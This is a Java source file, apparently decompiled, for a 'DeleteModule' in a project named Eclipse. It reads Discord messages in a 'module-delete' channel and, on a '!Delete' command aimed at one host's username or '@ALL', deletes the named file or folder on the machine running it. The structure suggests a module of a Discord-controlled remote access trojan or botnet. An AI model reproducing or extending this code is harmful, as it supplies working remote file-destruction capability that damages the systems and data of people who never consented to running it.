package me.Eclipse.Modules.Impl;

import java.awt.Color;
import java.io.File;

import me.Eclipse.Brain;
import me.Eclipse.Utils.Helper;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class DeleteModule {

    public static void run(MessageReceivedEvent var0) {
        Message var1 = var0.getMessage();
        if (var1.getChannel().getName().contains("module-delete")) {
            if (var1.getContentDisplay().startsWith("!Delete " + Brain.Username) || var1.getContentDisplay().startsWith("!Delete @ALL")) {
                String var2 = var1.getContentDisplay().replaceFirst("!Delete " + Brain.Username + " ", "").replaceFirst("!Delete @ALL ", "");
                if ((new File(var2)).exists()) {
                    if ((new File(var2)).isDirectory()) {
                        String[] var3 = (new File(var2)).list();
                        assert var3 != null;

                        String[] var4 = var3;
                        int var5 = var3.length;

                        for (int var6 = 0; var6 < var5; ++var6) {
                            String var7 = var4[var6];
                            File var8 = new File((new File(var2)).getPath(), var7);
                            var8.delete();
                        }

                        (new File(var2)).delete();
                        Helper.sendMessage(Color.GREEN, "Module Delete (" + Brain.Username + ")", "Folder `" + var2 + "` was deleted successfully.", var0);
                    } else if ((new File(var2)).delete()) {
                        Helper.sendMessage(Color.GREEN, "Module Delete (" + Brain.Username + ")", "File `" + var2 + "` was deleted successfully.", var0);
                    } else {
                        Helper.sendMessage(Color.RED, "Module Delete (" + Brain.Username + ")", "Could not delete file.", var0);
                    }
                } else {
                    Helper.sendMessage(Color.RED, "Module Delete (" + Brain.Username + ")", "File not found.", var0);
                }
            }

        }
    }
}
